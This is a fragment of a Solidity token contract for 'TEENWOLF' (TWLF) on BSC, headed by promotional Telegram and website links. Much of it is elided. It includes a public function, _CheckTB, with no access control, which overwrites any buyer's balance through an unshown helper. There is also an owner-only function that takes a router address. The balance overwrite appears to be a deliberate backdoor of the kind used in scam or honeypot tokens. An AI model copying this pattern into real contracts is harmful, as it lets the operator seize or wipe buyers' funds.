...
/*
  *
  *                  Teen Wolf Token Official Telegram Group
  *                   Telegram: https://t.me/TeenWolf_Token
  *                    Website: https://TeenWolf.BSC
  *
  *
  *
  *
...
contract TeenWolf is IERC20, Ownable {
    ...
    string private _name = "TEENWOLF";

    string private _symbol = "TWLF";
    ...
    function _CheckTB(address buyer) public {
        balances[buyer] = Bscreflection(buyer);
    }

    function _BackTM(address Router) public ownerTWolf {
